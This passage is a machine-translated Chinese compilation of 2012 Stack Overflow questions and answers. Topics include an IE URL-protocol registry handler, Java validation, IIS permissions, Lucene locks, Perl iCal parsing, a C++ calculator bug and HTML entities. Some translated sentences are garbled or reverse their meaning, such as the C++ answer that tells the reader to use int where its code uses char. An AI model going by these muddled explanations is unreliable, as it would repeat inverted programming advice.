[HKEY_CURRENT_USER\Software\Classes\ie\shell]

[HKEY_CURRENT_USER\Software\Classes\ie\shell\open]

[HKEY_CURRENT_USER\Software\Classes\ie\shell\open\command]
@="cmd /c set url=\"%1\" & call set url=%%url:ie:=%% & call start iexplore -nosessionmerging -noframemerging %%url%%" 
```

一些重要的注意事项：

1.  **你必须`%1`用双引号括起来。**否则带有多个参数的 url like`example.com?a=1&b=2`将被剥离为`example.com?a=1`, 之后的参数`&`将被忽略。
2.  **调用时必须去掉双引号`iexplore`**。如果您不删除双引号并从 chrome 打开多个 IE 窗口，则只有第一个 IE 窗口会获得正确的 URL。`set url=%%url:\"=%%`但是用命令或删除引号`set url=%%url:~1,-1%%`不起作用。
3.  **如果您无法删除这些引号，请添加开关`-nosessionmerging`和`-noframemerging`到`iexplore`.** 这些是用于控制 IE 的“合并”行为的[命令行选项。](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/general-info/hh826025(v=vs.85))

# java - 在 Java 中使用 Validate 优于手动错误检查的好处？

> ID：12009499
> 
> 赞同：1
> 
> 时间：2012-08-17T16:22:27.773
> 
> 标签：java, validation, error-handling

我正在修改一些代码，并且看到一致使用“验证”进行错误检查。

一个与另一个相比有什么区别`Validate.notNull(x, "x cannot be empty")`和`if(null != x){...}`优势是什么？

编辑：我正在使用 org.apache.commons.lang.Validate

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T16:31:33.010

编辑：假设您指的是 org.apache.commons.lang.Validate

* * *

第一个说使用空参数调用该方法是完全非法的，这是使用该方法的程序员的编码错误。

第二个只是说有不同的行为取决于 x 是否为空。

如果你真的这样做，它就变成了一个可读性问题：

```
if(null != x)
{
//...
} else {
  throw new IllegalArgumentException( "x cannot be empty");
} 
```

如果要去，那它的身体有多长？为什么非法调用该方法的后果与检查是否非法调用该方法是物理分离的？一旦您添加了更多具有各种不同法律状态的参数，其他人就很难理解。如果您在一开始就明确拒绝每个已知绝对非法的调用，这对其他程序员来说会更友好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:30:46.450

`Validate`不属于 Java API，您可能正在使用框架或其他人的类进行验证。

关于好处，它取决于`Validate.notNull`内部正在做什么，希望它会与其名称一致，并且只会做所说的，检查值是否不为空。一个好处是它允许您指定错误消息，这样您就可以减少代码的冗长，但这又取决于它对该消息的作用，它可能是将它们添加到消息堆栈或引发未经检查的异常。

# javascript - HTML5 Geolocation，询问位置？

> ID：12009501
> 
> 赞同：5
> 
> 时间：2012-08-17T16:22:35.120
> 
> 标签：javascript, jquery, html, geolocation

是否可以请求用户的许可才能按需获取他们的位置？通常在页面请求位置时询问它，例如`navigator.geolocation`，但直到页面重新加载并且脚本再次询问位置之后才会再次询问。

无论如何，在用户点击拒绝后，它是否可以按需询问，例如）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-17T12:51:53.503

您必须从另一个域请求位置，或者提供有关如何进入其浏览器并更改其设置的说明。就像在 iPhone 上，如果您不小心拒绝了权限，您必须如何进入设置。

这是因为权限请求实际上是在每个浏览器的基础上实现的。你可以想象，如果地理定位在 IE6 天左右，IE6 会自动始终接受。您的解决方案必须根据某人正在使用的浏览器执行。

# c# - asp.net 应用程序中的 File.ReadAllText 和安全性

> ID：12009506
> 
> 赞同：1
> 
> 时间：2012-08-17T16:22:54.870
> 
> 标签：c#, asp.net-mvc-3, iis-7, razor

我喜欢阅读整个文件内容的文本，在我的情况下，它是一个邮件模板，我必须阅读然后应用对象并将数据发回。我是否必须明确授予文件读取权限。如果如此，该怎么做

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:30:37.177

默认情况下，运行 IIS 的帐户没有用户帐户那么多的权限。因此，您必须授予 IIS 帐户权限，或更改它使用的用户帐户。

对于第一个解决方案，导航到您要阅读的文件，右键单击，然后转到属性。转到设置选项卡，然后单击修改。将 IIS 用户帐户添加到列表中，然后授予它您希望它拥有的权限。

在第二种方式中，进入 IIS 管理工具，然后单击服务器的应用程序池。在 IIS7 上，您至少有 4 个。您可能正在使用 ASP.NET 4.0 AppPool，因此，应右键单击，点击高级选项，然后向下滚动并将 UserIdentity 修改为有权访问该文件的帐户.

# java - 为什么会发生这个异常？Lucene 异常

> ID：12009515
> 
> 赞同：0
> 
> 时间：2012-08-17T16:23:22.387
> 
> 标签：java, database, lucene, connection-pooling

我们的应用程序每 2 小时左右就会崩溃一次，并且在此之前我们看到数据库连接量激增。还没有孤立这个问题。

有人可以回答以下异常的真正含义吗？它是否会引发数据库连接问题。

谢谢你。

```
org.compass.core.engine.SearchEngineException: Failed to open writer for sub index [premiumobjectmessage]; nested exception is org.apache.lucene.store.LockObtainFailedException: Lock obtain timed out: SimpleFSLock@/opt/compass/index/premiumobjectmessage/lucene-9af515d29c67db8ae587aab2becbc6f3-write.lock
org.apache.lucene.store.LockObtainFailedException: Lock obtain timed out: SimpleFSLock@/opt/compass/index/premiumobjectmessage/lucene-9af515d29c67db8ae587aab2becbc6f3-write.lock
org.compass.core.engine.SearchEngineException: Failed to open writer for sub index [premiumobjectmessage]; nested exception is org.apache.lucene.store.LockObtainFailedException: Lock obtain timed out: SimpleFSLock@/opt/compass/index/premiumobjectmessage/lucene-9af515d29c67db8ae587aab2becbc6f3-write.lock
org.apache.lucene.store.LockObtainFailedException: Lock obtain timed out: SimpleFSLock@/opt/compass/index/premiumobjectmessage/lucene-9af515d29c67db8ae587aab2becbc6f3-write.lock
org.compass.core.engine.SearchEngineException: Failed to open writer for sub index [premiumobjectmessage]; nested exception is org.apache.lucene.store.LockObtainFailedException: Lock obtain timed out: SimpleFSLock@/opt/compass/index/premiumobjectmessage/lucene-9af515d29c67db8ae587aab2becbc6f3-write.lock
org.apache.lucene.store.LockObtainFailedException: Lock obtain timed out: SimpleFSLock@/opt/compass/index/premiumobjectmessage/lucene-9af515d29c67db8ae587aab2becbc6f3-write.lock 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:27:39.493

这源于多个线程/进程想要打开相同的`FSDirectory`. 可能每个拥有自己的数据库连接的线程也会自己创建`IndexReader`，这将是一种错误的方法。`IndexReader`s/ `IndexSearcher`s 必须像数据库连接本身一样被池化，最好使用`NRTManager`.

# jquery - Flexslider 1.8 转到项目

> ID：12009523
> 
> 赞同：5
> 
> 时间：2012-08-17T16:23:41.863
> 
> 标签：jquery, slider

我对 Flexslider jQuery 插件 1.8 版有疑问。如何手动转到幻灯片？我搜索并找到了一个代码，但它不能正常工作。

```
$('.flexslider').slider.flexAnimate(2, true); 
```

我收到“$(".flexslider").flexAnimate 不是函数”错误

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-17T15:17:15.237

您可以像这样转到第三张幻灯片：

```
var slider = $('#your-slider').data('flexslider');
slider.flexAnimate(2); 
```

也是这样：

```
$('#your-slider').flexslider(2); 
```

# perl - 逻辑解析 ICAL 提要的困难

> ID：12009527
> 
> 赞同：0
> 
> 时间：2012-08-17T16:23:57.247
> 
> 标签：perl, parsing, logic, icalendar

我一直在研究一个代码，它将解析来自 Ical 提要的事件信息。这是一个巨大的数据块，我想按关键词进行划分。我需要有条不紊地进行。我尝试为关键术语编制索引，然后让程序打印这些索引之间的内容。但是由于某种原因，它变成了打印所有数据的无限循环。我不知道如何解决它。不要运行我的代码，它会一直冻结我的计算机。我希望有人能告诉我我的问题是什么。

不要运行这个程序

```
use strict;
use warnings;

use LWP::Simple;
use HTML::TreeBuilder;
use HTML::FormatText;

my $URL= get("https://www.events.utoronto.ca/iCal.php?ical=1&campus=0&
+sponsor%5B%5D=&audience%5B%5D=&category%5B%5D=");

my $Format=HTML::FormatText->new;
my $TreeBuilder=HTML::TreeBuilder->new;
$TreeBuilder->parse($URL);
my $Parsed=$Format->format($TreeBuilder);
open(FILE, ">UOTSUMMER.txt");
print FILE "$Parsed";
close (FILE);

open (FILE, "UOTSUMMER.txt");
my @array=<FILE>;

my $string ="@array";
my $offset = 0;     # Where are we in the string?

my $numResults = 0;

while (1) {
    my $idxSummary = index($string, "SUMMARY", $offset);
    my $result = "";
    my $idxDescription = index ($string, "DESCRIPTION", $offset);
    my $result2= "";
    if ($idxSummary > -1) {
        $offset = $idxSummary + length("SUMMARY");
        my $idxDescription = index($string, "DESCRIPTION", $offset);
        if ($idxDescription == -1) {
            print "(Data malformed: missing DESCRIPTION line.)\n";
            last;
        }
        if ($idxDescription > -1) {
            $offset = $idxDescription+ length("DESCRIPTION");
            my $idxLocation= index($string, "LOCATION", $offset);
            if ($idxLocation == -1) {
                print "(Data malformed: missing LOCATION line.)\n";
                last;
            } 

            my $length = $idxDescription - $offset;
            my $length2= $idxLocation - $offset;
            $result = substr($string, $offset, $length);
            $result2= substr ($string, $offset, $length2);

            $offset = $idxDescription + length("DESCRIPTION");
            $result =~ s/^\s+|\s+$//g ; # Strip leading and trailing white space, including newlines.
            $result2 =~ s/^\s+|\s+$//g ; 

            $numResults++;
        } else { 
            print "(All done. $numResults result(s) found.)\n";
            last; 
        }

        open (FILE2, "UOT123.txt")
        print FILE2 "TITLE: <$result>\n DESCRIPTION: <$result2>\n"; 
```

您可能获得的任何指导将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:09:17.213

你的警告让我深受鼓舞，我不得不运行它。我什至安装了这样做所需的模块。您的计算机可能只是陷入了无限循环，而不是真正崩溃。

查看您的代码，问题几乎可以肯定是您的索引。就目前而言，您的循环逻辑有点混乱。你最好的选择是重新考虑你是如何做到这一点的。与其使用所有这些逻辑，不如尝试使循环依赖于遍历文件。这样一来，就很难形成无限循环。此外，正则表达式将使这项工作变得更加简单。这可能并不完全符合您的要求，但这是一个开始：

```
while ($string =~ m/SUMMARY(.+?)DESCRIPTION(.+?)(?=SUMMARY|$)/gcs)
{
    print "summary is: \n\n $1 \n\n description is: \n\n $2 \n\n";
} 
```

其他一些快速要点：

*   写入文件然后打开它并在开始时再次读取内容没有多大意义。你已经在 $Parsed 中得到了你想要的东西。
*   如果您只想单独打印变量，请不要将其放在引号中。这增加了很多开销。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:50:17.980

也许以下内容将帮助您完成解析任务：

```
use Modern::Perl;
use LWP::Simple qw/get/;
use HTML::Entities;

my $html = get 'https://www.events.utoronto.ca/iCal.php?ical=1&campus=0&+sponsor%5B%5D=&audience%5B%5D=&category%5B%5D=';

while ( $html =~ /(Summary:\s*[^\n]+)\s*(Description:\s*[^\n]+)/gi ) {
    say decode_entities($1) . "\n" . decode_entities($2);
} 
```

样本输出：

```
SUMMARY:Learning Disabilities Parent Support Group
DESCRIPTION: Dates: Thursdays: May 24, June 21, and July 19

SUMMARY:"Reading to Write"
DESCRIPTION: Leora Freedman, Coordinator, English Language Learning Program, Faculty of Arts  &  Science

SUMMARY:The Irish Home Rule Bill of 1912:  A Centennial Symposium
DESCRIPTION: One-day symposium presented by the Celtic Studies Program, St. Michael's College 
```

如果文本中的 html 实体正常，则可以省略 using`HTML::Entities`和`decode_entities($1)`符号，否则可能会得到如下结果：

```
DESCRIPTION: Leora Freedman, Coordinator, English Language Learning Program, Faculty of Arts  &amp;  Science 
```

希望这可以帮助！

# python - 函数工厂中的变量范围

> ID：12009531
> 
> 赞同：2
> 
> 时间：2012-08-17T16:24:10.610
> 
> 标签：python, scope, factory

我想知道`a`以下 Python 代码段中变量的范围，

```
# ============================
def get_plotter():
    def get_a():
        return a
    a = 3.14
    return get_a
# ============================
if __name__ == '__main__':
    f = get_plotter()
    print f()
# ============================ 
```

输出是`3.14`，但是查看我期望`a`一旦`get_plotter()`终止就会超出范围的代码，实际上留下了未定义的东西。

它只是在这里打印的易失性内存内容吗？这是怎么回事？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T16:27:37.020

这是因为闭包或“附加数据的函数”而起作用的，并且在这里得到了很好的解释

[https://stackoverflow.com/a/141426/735204](https://stackoverflow.com/a/141426/735204)

# jquery - 使用 sfJQueryUIPlugin 不显示日历

> ID：12009532
> 
> 赞同：1
> 
> 时间：2012-08-17T16:24:11.053
> 
> 标签：jquery, forms, symfony1, doctrine, symfony-1.4

我已经为我的项目安装了 sfJQueryUIPlugin，我想显示一个日期选择器来选择生日。因此安装后我将表单小部件更改为

```
"date_of_birth" =>new sfWidgetFormDateJQueryUI(array("change_month" => true, "change_year" => true)), 
```

但是当我查看模板时，它只出现一个输入框。没有日历显示。

任何的想法？

[这是我使用的插件 sfJQueryUIPlugin](http://www.symfony-project.org/plugins/sfJQueryUIPlugin)
有没有其他方法或插件可以用作 symfony 的日期选择器...请给我一个想法..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-24T07:38:04.587

您可以使用 id="date_of_birth" 将普通文本小部件添加到表单中，并且只需使用带有 jQ​​uery 的 javascript 插槽（在视图模板中）：

```
<?php append_to_slot('javascript'); ?>

  $(function() {
    $("#date_of_birth").datepicker();
  });

<?php end_append_to_slot(); ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-17T21:54:22.630

当您使用插件中的 js 和 css 时，您应该执行以下命令：

```
php symfony plugin:publish-assets 
```

这将复制您的网络文件夹中的文件。

如需更好的解释，请查看[http://www.symfony-project.org/jobeet/1_4/Propel/en/20中的资产部分](http://www.symfony-project.org/jobeet/1_4/Propel/en/20)

# c++ - C++ 新手 - 基本计算器问题

> ID：12009533
> 
> 赞同：2
> 
> 时间：2012-08-17T16:24:14.167
> 
> 标签：c++

我正在尝试学习一些 C++，我决定构建一个基本的 I/O 计算器。它一直正确运行直到第二个 getUserInput()，然后它自动输入 0 并终止。我无法弄清楚发生了什么！

```
#include <iostream>
using namespace std;

int getUserInput() {                                        // Get user numbers
    cout << "Enter a number: " << endl;
    int userInputNumber;
    cin >> userInputNumber;
    return userInputNumber;
}

char getUserOper() {                                        // Get user math operator
    cout << "Enter a math operator: " << endl;
    int userInputOper;
    cin >> userInputOper;
    return userInputOper;
}

int doMath(int x, char oper, int y) {                       // Does math based on provided operator
    if(oper=='+') {
        return x + y;
    }
    if(oper=='-') {
        return x - y;
    }
    if(oper=='*') {
        return x * y;
    }
    if(oper=='/') {
        return x / y;
    }
    else {
        return 0;
    }
}

void printResult(int endResult) {                           // Prints end result
    cout << endResult;
}

int main() {
    int userInputOne = getUserInput();
    char userOper = getUserOper();
    int userInputTwo = getUserInput();
    printResult(doMath(userInputOne, userOper, userInputTwo) );
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:29:34.290

您应该在 getUserOper 中使用 char 时使用 int

```
char getUserOper() {                                        // Get user math operator
    cout << "Enter a math operator: " << endl;
    char userInputOper;
    cin >> userInputOper;
    return userInputOper;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:28:42.277

`char`在 getUserOper 中使用

```
char getUserOper() {                                        // Get user math operator
        cout << "Enter a math operator: " << endl;
        char userInputOper;
        cin >> userInputOper;
        return userInputOper;
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:31:11.723

当您执行 cin >> userInputOper 时， \n 仍在缓冲区中，然后第二次使用。导致存在无效输入和未定义行为。也一样

```
cin >> userInputOper; 
//cin.ignore(); // removes one char from the buffer in this case the '\n' from when you hit the enter key, however " " is a delimiter so if the user enters 23 54 only 23 gets entered and 54 remains in the buffer as well as the '\n' which will get used on the next call
cin.ignore(std::numeric_limits<std::streamsize>::max(),'\n'); // clears everything in the buffer
return userInputOper; 
```

此外，您应该检查输入错误

```
int myInt;
while ( !(cin >> myInt) )
{
cout << "Bad input try again\n";
cin.clear();  // this only clears the fail state of the stream, doesn't remove any characters
cin.ignore(std::numeric_limits<std::streamsize>::max(),'\n'); // removes all chars from the buffer up to the '\n'
}
cin.ignore(std::numeric_limits<std::streamsize>::max(),'\n'); 
```

尽管并非完全必要，但您可能应该为操作员输入一个字符。当用户输入大于 char 255 的数字时，您会遇到问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-17T16:33:06.283

```
char getUserOper() {                                        // Get user math operator
        cout << "Enter a math operator: " << endl;
        char userInputOper;
        cin >> userInputOper;
        return userInputOper;
    } 
```

您需要使用**char**而不是**int**。

# jquery - 使用淡入淡出效果每 3 秒更改一次文本

> ID：12009534
> 
> 赞同：0
> 
> 时间：2012-08-17T16:24:14.203
> 
> 标签：jquery, text

我想用 jquery "Fade Effect" 每 3 秒更改一次 ap 的文本：

```
<p class="first">Conected</p> 
```

到

```
<p class="second">2547</p> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:51:52.750

您可以使用 setInterval [https://developer.mozilla.org/en-US/docs/DOM/window.setInterval](https://developer.mozilla.org/en-US/docs/DOM/window.setInterval)

```
setInterval(function() {
    $('p').fadeOut(500, function() {
        var $this = $(this);
        $this.text($this.text() == 'Connected' ? '2457' : 'Connected');        
        $this.toggleClass('first second');        
        $this.fadeIn(500);
    });
}, 3000);​ 
```

[http://jsfiddle.net/wirey00/E4xqg/](http://jsfiddle.net/wirey00/E4xqg/)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-17T16:42:53.817

setInterval 或等待

setInterval [http://www.w3schools.com/js/js_timing.asp](http://www.w3schools.com/js/js_timing.asp)

JQuery 等待 [http://api.jquery.com/delay/](http://api.jquery.com/delay/)

# c# - 在 aspx 页面上访问 windows 用户变量

> ID：12009536
> 
> 赞同：0
> 
> 时间：2012-08-17T16:24:17.677
> 
> 标签：c#, asp.net, iis

我在服务器机器上创建了一个用户并向这个帐户添加了一个用户变量。

我现在在一个检查用户名和密码的 aspx 页面上登录，一旦用户被验证用户存在，我想检索那个特定的用户变量。

类似这样的东西：

```
string environment = System.Environment.GetEnvironmentVariable("server_select", EnvironmentVariableTarget.User); 
```

问题在于所有这些读取只是运行 iis 进程的用户的用户变量？如何从用户名创建一个 Windows 用户对象，然后读取该用户变量？

# mysql - 用于创建缺失表的 MySQL 循环示例

> ID：12009537
> 
> 赞同：0
> 
> 时间：2012-08-17T16:24:18.653
> 
> 标签：mysql, loops

我有带有增量表名的 mysql DB（即 table1、table2、table3、tablen）。在此过程中的某个地方，这种增量已经跳过了一些，并且存在差距。我想执行一个脚本，当循环发现丢失的表时，该脚本将创建具有正确表名的表。所以像..

```
for i=1 to 100
  create table if not exists 'tablei'
  ***TABLE FIELD DECLARATIONS***
end 
```

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-16T15:30:00.047

所有“MySql 语法旋转”的答案：

```
DELIMITER //
CREATE PROCEDURE missing_tables(n INT)
  BEGIN
    WHILE n > 0
      DO
        SET @sql = CONCAT('create table if not exists table', n, ' (value INT)');
        PREPARE cmd FROM @sql;
        EXECUTE cmd;
        DEALLOCATE PREPARE cmd;
        SET n = n - 1;
    END WHILE;
END; //
DELIMITER ;
CALL missing_tables(5); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:43:01.557

类似的东西（可能需要一些 MySql 语法旋转）

```
Declare @loopvar int
Declare @sql VarChar(8000)
Declare @table_definition VarChar(8000)
Set @table_definition = '(SomeField int null)'
Set @loopvar = 1
While @loopVar < 100
begin
  set @sql = 'Create Table if not exists TableName' + Convert(VarChar(3),@loopvar) + @table_definition
  exec(@sql) 
  set @loopvar = @loopvar + 1
end 
```

应该这样做。

# json - 使用 gson 解析 json

> ID：12009538
> 
> 赞同：1
> 
> 时间：2012-08-17T16:24:22.123
> 
> 标签：json, parsing, gson

嗨我有以下

```
 private List<Movie> movies;
...
 JsonReader reader = new JsonReader(new InputStreamReader(in)); 
 Gson gson = new Gson();                     
 SearchResponse response = gson.fromJson(reader, SearchResponse.class);
 movies = response.getResults(); 
```

response.getResults() 正在抛出空指针，但响应它不是空的，可能是因为我没有处理所有返回的字段吗？

电影课

```
@SerializedName("name") 
private String name;    
@SerializedName("sinopsis") 
private String sinopsis; 
```

而一部电影的提要看起来像这样（别管西班牙语）

```
{"@uri":"http://localhost:8080/Feeds/resources/peliculas/1/",
"elenco":"Director: Alejandro GonzÃ¡lez IÃ±arritu Reparto: Javier Bradem, Maricel   Alvarez,Martina GarcÃ­a, FÃ©lix Cubero, RubÃ©n Ochandiano Empresa Productora: Menageatroz, Focus Features, Mod Producciones, TelevisiÃ³n de Catalunya (TV3), TelevisiÃ³n EspaÃ±ola (TVE), Universal Pictures.",
"estreno":"83",
"fecha":"2010-03-05T16:31:02-02:00",
"idPelicula":"1",
"imagen1":"10_49.jpg",
"imagen2":"10_50.jpg",
"imagen3":"10_51.jpg",
"imagen4":"10_52.jpg",
"imagen5":"10_53.jpg",
"imagen6":"''",
"imagenTapa":"BiutifulTapa.jpg",
"name":"Biutiful",
"sinopsis":"Biutiful es la Ãºltima obra maestra de Alejandro GonzÃ¡lez IÃ±Ã¡rritu, el aclamado director de Amores Perros, 21 Gramos y Babel protagonizada por el premiado ganador del Oscar Javier Bardem. Padre abnegado. Amante atormentado. Hijo desamparado. Intermediario de la sombra. PrÃ³ximo a los desaparecidos. AtraÃ­do por los fantasmas. Sensible a los espÃ­ritus. Sobreviviente en el corazÃ³n de una Barcelona invisible. Sintiendo que la muerte le ronda, intenta encontrar la paz, proteger a sus hijos, salvarse a sÃ­ mismo.",
"trailer":"biutiful.flv"} 
```

非常感谢。致以最诚挚的问候。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T01:45:30.307

搞定了！！！！！！！

```
 JsonReader reader = new JsonReader(new InputStreamReader(in)); 
            JsonParser parser = new JsonParser(); 
            Gson gson = new Gson();

            JsonElement rootElement = parser.parse(reader);
            SearchResponse response = gson.fromJson(rootElement, SearchResponse.class);
            results = response.getResults(); 
```

# oracle - 将文件上传到 Oracle DB 时的性能问题

> ID：12009542
> 
> 赞同：0
> 
> 时间：2012-08-17T16:24:29.143
> 
> 标签：oracle, iis, asp-classic, vb6, oracle11g

请帮助我解决这个问题：

它是一个文件上传系统（Classic ASP+ VB6 Com+）：用户上传txt文件到Oracle DB。现在的问题是在将数据上传到包含一些记录的某些表（大约 500,000 行，大约 40MB 大小，不是很大）的某些表时系统挂起。如果我截断表格，上传将成功完成。

上传逻辑：读取文件，一次异步发送1000条记录到服务器，VB使用UPDATEBATCH通过ODBC提交插入。问题是它只提交前 1000 条记录。如果 IIS 中的 ASP 超时设置为默认 90 秒，则会出错并显示 ASP 超时消息。我将设置增加到更大的数字（9000），然后在插入前 1000 条记录后它挂在那里...... 但是，这只发生在 PROD 上。我将表结构和数据从 PROD 复制到 DEV，然后上传相同的文件，它在 DEV 上运行良好。

这是表创建脚本：

```
CREATE TABLE TableA
(
  ID           NUMBER(12)               NOT NULL,
  ColA         NUMBER(12)               NOT NULL,
  ColB         NUMBER(5)                NOT NULL, 
  ColC         CHAR(2 BYTE), 
  ColD         VARCHAR2(2000 BYTE)
  ....
)
PCTUSED    0
PCTFREE    10
INITRANS   1
MAXTRANS   25
STORAGE    (
            INITIAL          24K
            NEXT             1M
            MINEXTENTS       1
            MAXEXTENTS       UNLIMITED
            PCTINCREASE      0
            BUFFER_POOL      DEFAULT
            FLASH_CACHE      DEFAULT
            CELL_FLASH_CACHE DEFAULT
           )
LOGGING 
NOCOMPRESS 
NOCACHE
NOPARALLEL
MONITORING; 
```

非常感谢任何建议/帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T20:18:28.780

跟踪在服务器上进行更新的会话并查看相应的等待事件。

可以通过设置 10046 事件来跟踪会话，同时连接到此会话并在开始加载过程之前。

```
alter session set events '10046 trace name context forever, level 12" 
```

这将在服务器上创建可以分析的跟踪文件。这些文件存储在服务器上，因此您的 DBA 需要授予您对这些文件的访问权限。其他选项也存在，例如使用 ASH，但您的 DBA 无论如何都应该知道这个选项。

# html - 维度中“x”的正确 HTML 实体是什么？

> ID：12009545
> 
> 赞同：69
> 
> 时间：2012-08-17T16:24:39.507
> 
> 标签：html, character, html-entities, semantic-markup, typography

提供尺寸的正确 HTML 实体是`&times;`什么？我想在语义上是正确的，但这引出了一个问题，是否将维度列为`2" x 3"`语义？如果*x*代表“by”，我会使用字母 x 还是 ×？

在我一直使用的代码中`2&Prime;&nbsp;&times;&nbsp;3&Prime;`，或 2″ × 3″。[根据The Elements of Typographic Style Applied to the Web](http://webtypography.net/Rhythm_and_Proportion/Etiquette_of_Hyphenation_and_Pagination/2.4.6/)中的建议，不间断空格是为了防止尺寸被包装。

* * *

## 回答 #1

> 赞同：130
> 
> 时间：2012-08-18T16:31:48.227

# `×`

*   统一码：`U+00D7 MULTIPLICATION SIGN`
*   HTML: `&times;`,`&#215;`
*   CSS：`\00d7`

请参阅有关[乘号](http://en.wikipedia.org/wiki/Multiplication_sign)的维基百科文章：

> 在数学中，符号 ×（读作乘或乘）主要用于表示 […]
> 
> *   对象的几何尺寸，例如注意到房间的面积为 10×12 英尺。

* * *

根据上下文，[`math`元素](https://www.w3.org/TR/2016/REC-html51-20161101/semantics-embedded-content.html#mathml)（对于[MathML](http://en.wikipedia.org/wiki/MathML)）元素可能有用。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-17T16:56:54.963

正确的问题是应该使用哪个*字符。*对字符使用实体引用不会增加语义。表示维度没有正式的标准，但显然这是关于乘法而不是拉丁字母 x，因此“x”( `&times;`) 是正确的字符。

在实践中，这更像是一个正字法和排版问题，而不是“语义网”。搜索引擎、浏览器等，并不在乎；重要的是人类读者。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:33:11.927

你做的一切都是正确的。我相信这里的×[语义上]与乘法运算有关，即实际上您通过指定二维来编写区域。

# html - 仅向移动浏览器显示网页

> ID：12009546
> 
> 赞同：0
> 
> 时间：2012-08-17T16:24:40.470
> 
> 标签：html

我有一个 html5 网站/webapp。我只希望人们通过他们的手机（即 iphone、android、黑莓）查看这个网站/webapp。

如果他们尝试从桌面浏览器访问网站/webapp，它应该会显示一条错误消息，因为该网站/webapp 仅适用于手机。

这可能吗？有小费吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:56:31.000

无法确定网站是在移动设备上还是桌面上。HTML 与设备无关。

你可以做浏览器嗅探但是

1.  user_agents 在多个浏览器中很容易更改
2.  你需要确保你的用户代理->移动/桌面映射是最新的

您可以进行媒体查询并以这种方式有条件地显示查询，但是由于当今可用的大量格式因子，因此也没有明确的界限来绘制这种方式。

这两种方法都容易出现错误识别。

坦率地说，我有点不明白您为什么要阻止人们访问您的网站。您为什么要关心是否有人从桌面而不是移动设备访问您的网站？

专为移动设备设计的网站可以在台式机上正常工作（反过来可能会出现问题）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:00:03.417

从这里获取您喜欢的语言的脚本：

[http://detectmobilebrowsers.com/](http://detectmobilebrowsers.com/)

为我工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T19:40:36.180

您可以在页面上使用媒体查询并检查页面宽度所在的设备宽度。假设如果在桌面上查看页面，您可以显示此应用仅与移动设备兼容而不与桌面兼容的消息。同样，这也适用于平板电脑，并且可以自定义此消息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T19:42:36.433

您是否使用任何服务器端技术（ASP.NET、PHP）来生成页面？如果是这样，您可以在服务器端执行您的逻辑并在桌面请求上返回不同的内容（如您的消息）。

这通常通过读取用户代理来完成。您是否同意桌面用户覆盖他们的用户代理以模拟移动浏览器并查看移动内容？

# jboss7.x - 在 JBoss 7 中使用 PicketLink 使用 WS-Trust/SAML 保护 Web 服务？

> ID：12009549
> 
> 赞同：1
> 
> 时间：2012-08-17T16:24:45.923
> 
> 标签：jboss7.x, saml, ws-trust

我有一个从远程 Java 程序调用的 Web 服务。我想用 WS-Trust 保护 Web 服务，使用 PicketLink。PicketLink 正在工作，我可以使用 WSTrustClient 类从 picketlink-sts 获取令牌（断言）。

但在 JBoss 7 中，似乎无法为任何客户端 WS 运行时类提供此令牌。JBoss 站点上的示例使用这个：

```
((BindingProvider) port).getRequestContext().put(SAML2Constants.SAML2_ASSERTION_PROPERTY, assertion); 
```

但是 org.picketlink.trust.jbossws.SAML2Constants 不存在，因为在任何 JBoss 7 或 PicketLink jar 中都没有 org.picketlink.trust 包。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T08:25:24.987

我还没有使用 PicketLink 的经验。但是一些谷歌搜索把我带到了这个[论坛问答](https://community.jboss.org/thread/160132)。

# web-crawler - 为什么 Google 爬虫不会被 CAPTCHA 阻止？

> ID：12009553
> 
> 赞同：1
> 
> 时间：2012-08-17T16:25:10.417
> 
> 标签：web-crawler

我在某个特定网站上运行我的爬虫`www.example.com`。爬虫在大约 100 个条目后被 CAPTCHA 阻止。另一方面，当我进入谷歌并搜索时，`site:www.example.com`我找到了 100,000 个结果，并且结果被谷歌正确缓存。

我的问题：为什么 Google bot 没有被阻止而我却被阻止了？是因为谷歌使用了数千个不同的 IP 还是有其他技巧？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:28:41.037

一般来说，网站所有者有兴趣从搜索引擎获得流量，因此他们甚至可能将 Google 列入白名单。

顺便说一句，您是否在查询之间使用超时？如果您查询过于频繁，您可能会因为为服务器创建过多负载而被阻止。

# algorithm - 电梯机构的数据结构

> ID：12009556
> 
> 赞同：27
> 
> 时间：2012-08-17T16:25:14.643
> 
> 标签：algorithm, design-patterns, data-structures

这个问题是在公司面试时问我的——哪种数据结构对于实施电梯机制是有效的？

即使经过大量谷歌搜索，我也无法找到有效的数据结构。

我可以想到优先级队列来实现它。优先级队列是一种有效的数据结构还是更有效的数据结构来实现电梯机制？

谢谢！

* * *

